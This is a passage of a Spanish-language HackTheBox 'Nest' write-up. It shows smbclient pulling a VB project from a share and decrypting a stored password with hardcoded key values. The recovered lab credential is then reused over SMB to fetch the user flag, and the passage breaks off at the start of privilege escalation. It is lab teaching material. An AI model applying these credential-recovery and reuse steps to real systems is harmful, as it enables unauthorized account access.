smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; mask &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; recurse ON
smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; prompt OFF
smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; mget *
getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigFile.vb of size &lt;span class=&#34;m&#34;&gt;772&lt;/span&gt; as ConfigFile.vb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2.2 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 2.2 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;odule1.vb of size &lt;span class=&#34;m&#34;&gt;279&lt;/span&gt; as Module1.vb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.8 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 1.5 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;y Project&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;pplication.Designer.vb of size &lt;span class=&#34;m&#34;&gt;441&lt;/span&gt; as Application.Designer.vb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1.2 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 1.4 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;y Project&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;pplication.myapp of size &lt;span class=&#34;m&#34;&gt;481&lt;/span&gt; as Application.myapp &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1.5 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 1.4 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;y Project&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ssemblyInfo.vb of size &lt;span class=&#34;m&#34;&gt;1163&lt;/span&gt; as AssemblyInfo.vb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1.9 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 1.6 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;y Project&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;esources.Designer.vb of size &lt;span class=&#34;m&#34;&gt;2776&lt;/span&gt; as Resources.Designer.vb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;7.8 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 2.5 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;y Project&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;esources.resx of size &lt;span class=&#34;m&#34;&gt;5612&lt;/span&gt; as Resources.resx &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;9.3 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 3.9 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;y Project&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ettings.Designer.vb of size &lt;span class=&#34;m&#34;&gt;2989&lt;/span&gt; as Settings.Designer.vb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;8.6 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 4.4 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;y Project&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ettings.settings of size &lt;span class=&#34;m&#34;&gt;279&lt;/span&gt; as Settings.settings &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.8 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 4.1 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U Scanner.vbproj of size &lt;span class=&#34;m&#34;&gt;4828&lt;/span&gt; as RU Scanner.vbproj &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;13.3 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 4.9 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U Scanner.vbproj.user of size &lt;span class=&#34;m&#34;&gt;143&lt;/span&gt; as RU Scanner.vbproj.user &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.3 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 4.4 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;soIntegration.vb of size &lt;span class=&#34;m&#34;&gt;133&lt;/span&gt; as SsoIntegration.vb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.4 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 4.1 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;tils.vb of size &lt;span class=&#34;m&#34;&gt;4888&lt;/span&gt; as Utils.vb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;7.5 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 4.5 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner.sln of size &lt;span class=&#34;m&#34;&gt;871&lt;/span&gt; as RUScanner.sln &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2.3 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 4.4 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Descargamos el proyecto, analizamos el codigo y vemos que es un proyecto que encripta una contraseña o una string desde un archivo de XML y tambien lo desencripta. Modificamos y ejecutamos el proyecto con el archivo &lt;code&gt;RU_config.xml&lt;/code&gt; para obtener la contraseña de C.Smith.&lt;/p&gt;
&lt;p&gt;Funcion DecryptString:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vb&#34; data-lang=&#34;vb&#34;&gt;&lt;span class=&#34;n&#34;&gt;Console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WriteLine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Decrypted Text: &amp;#34;&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;EncryptedString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;N3st22&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;88552299&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;464R5DFA5DL6LE28&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Threading&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Thread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;50000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Credenciales:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C.Smit:xRxRxPANCAK3SxRxRx
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/nest/Screenshot_20200129_004302.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos la contraseña en SAMBA (Users) y logramos leer nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/nest/tmp# smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;10.10.10.178&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Users -U C.Smith
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;.Smith&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; dir
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sat Jan &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 17:04:21 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sat Jan &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 17:04:21 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  Administrator                       D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Aug  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 09:08:23 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  C.Smith                             D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Jan &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 01:21:44 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  L.Frost                             D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Thu Aug  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 11:03:01 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  R.Thompson                          D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Thu Aug  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 11:02:50 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  TempUser                            D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 16:55:56 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;

		&lt;span class=&#34;m&#34;&gt;10485247&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;6449275&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; C.Smith
smb: &lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;.Smith&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; dir
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Jan &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 01:21:44 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Jan &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 01:21:44 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  HQK Reporting                       D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Thu Aug  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 17:06:17 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  user.txt                            A       &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt;  Thu Aug  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 17:05:24 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;

		&lt;span class=&#34;m&#34;&gt;10485247&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;6449275&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;.Smith&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get user.txt
getting file &lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;.Smith&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;ser.txt of size &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; as user.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.0 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 0.0 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
smb: &lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;.Smith&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
root@aoiri:~/htb/nest/tmp# cat user.txt 
cf71b25404be5d84fd827e05f426e987
root@aoiri:~/htb/nest/tmp#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/nest/Screenshot_20200129_004636.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Dentro de la carpeta principal de C.Smith encontramos dos archivos el primero parecia estar vacio &lt;code&gt;Debug Mode Password.txt&lt;/code&gt; y el segundo &lt;code&gt;HqkLdap.exe&lt;/code&gt; un ejecutable. Al obtener más informacion de este archivo encontramos que tiene &lt;strong&gt;Alternative Data Streams&lt;/strong&gt; como en la maquina Dropzone de HackTheBox, obtenemos el archivo y encontramos lo que parece ser una contraseña.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb# smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;10.10.10.178&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Users -U C.Smith &lt;span class=&#34;c1&#34;&gt;#xRxRxPANCAK3SxRxRx&lt;/span&gt;
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;.Smith&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
